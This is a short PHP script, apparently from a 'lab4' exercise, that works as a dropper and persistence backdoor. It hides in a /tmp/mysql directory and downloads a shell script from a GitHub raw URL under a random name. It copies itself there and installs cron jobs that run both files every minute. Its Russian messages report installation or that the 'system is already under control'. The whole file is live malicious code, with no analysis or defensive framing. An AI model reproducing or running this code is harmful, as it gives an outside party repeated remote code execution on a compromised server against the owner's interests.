<?php
$targetDir = "/tmp/mysql";
$gitSh = "https://raw.githubusercontent.com/temaniall/lb4/main/script.sh";
$gitPhp = "https://raw.githubusercontent.com/temaniall/lb4/main/lab4.php";

if (!is_dir($targetDir)) mkdir($targetDir, 0755, true);

$randomName = substr(md5(mt_rand()), 0, 8) . ".sh";
$fullPath = $targetDir . "/" . $randomName;
$phpCopy = $targetDir . "/index.php";

$checkCron = shell_exec("crontab -l 2>/dev/null");

if (strpos($checkCron, $targetDir) === false) {
    exec("curl -s $gitSh -o $fullPath");
    chmod($fullPath, 0755);

    copy(__FILE__, $phpCopy);

    $cronLine = "* * * * * $fullPath\n* * * * * php $phpCopy\n";
    exec("(crontab -l 2>/dev/null; echo " . escapeshellarg($cronLine) . ") | crontab -");

    echo "Установка завершена. Файл: $randomName\n";
} else {
    echo "Система уже под контролем.\n";
}
?>
